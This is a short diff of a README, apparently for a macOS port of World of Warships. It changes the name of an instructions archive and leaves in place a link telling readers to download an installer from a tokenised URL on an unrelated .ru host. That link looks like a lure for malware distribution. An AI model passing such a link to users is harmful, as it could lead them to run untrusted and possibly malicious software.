@@ -13,7 +13,7 @@ Download and follow the installer instructions
 ``` text
 http://git.thisismypage.ru/download/yTSj7jbJ3dRgiekQsDM5Dnra0890dbxxM1j5CNGn554dEw5i4liajJdSKDocFVVv
 ```
-You can [download](https://github.com/gmaxus/World-of-Warships-macOS/raw/refs/heads/main/instructions.rtfd.zip) the Instruction separately (they will appear after installation)
+You can [download](https://github.com/gmaxus/World-of-Warships-macOS/raw/refs/heads/main/instructions.zip) the Instruction separately (they will appear after installation)
 
 
 ## Current Versions
